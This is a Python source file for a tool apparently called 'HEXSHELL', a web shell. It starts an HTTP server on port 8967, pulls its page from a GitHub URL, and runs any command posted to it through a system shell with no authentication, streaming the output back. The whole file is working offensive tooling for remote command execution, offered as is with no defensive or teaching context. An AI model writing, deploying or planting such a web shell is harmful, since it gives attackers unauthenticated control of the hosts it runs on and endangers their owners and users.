from http.server import BaseHTTPRequestHandler, HTTPServer
import subprocess
import requests

print("""
 __   __  _______  __   __  _______  __   __  _______  ___      ___     
|  | |  ||       ||  |_|  ||       ||  | |  ||       ||   |    |   |    
|  |_|  ||    ___||       ||  _____||  |_|  ||    ___||   |    |   |    
|       ||   |___ |       || |_____ |       ||   |___ |   |    |   |    
|       ||    ___| |     | |_____  ||       ||    ___||   |___ |   |___ 
|   _   ||   |___ |   _   | _____| ||   _   ||   |___ |       ||       |
|__| |__||_______||__| |__||_______||__| |__||_______||_______||_______|
""")

INDEX = requests.get("https://raw.githubusercontent.com/Falcn8/hexshell/main/index.html").text

class Webshell(BaseHTTPRequestHandler):
    def _send_response(self, message):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(bytes(message, "utf8"))

    def do_GET(self):
        self._send_response(INDEX)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        cmd = post_data.split("=")[1].replace("+", " ")
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<!DOCTYPE html><html><head>')
        self.wfile.write(b'<link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">')
        self.wfile.write(b'</head><body class="bg-gray-100">')
        self.wfile.write(b'<div class="bg-white p-6 rounded-lg shadow-md mx-auto my-10 max-w-screen-md overflow-auto">')
        self.wfile.write(b'<pre class="text-gray-700">')
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            output = process.stdout.readline().decode()
            if output == '' and process.poll() is not None:
                break
            if output:
                self.wfile.write(bytes(output, "utf8"))
                self.wfile.flush()
        self.wfile.write(b'</pre></div></body></html>')

httpd = HTTPServer(('', 8967), Webshell)
print("Serving on port 8967\n")
try:
    httpd.serve_forever()
except KeyboardInterrupt:
    print("\nCtrl-C detected\nExiting...")
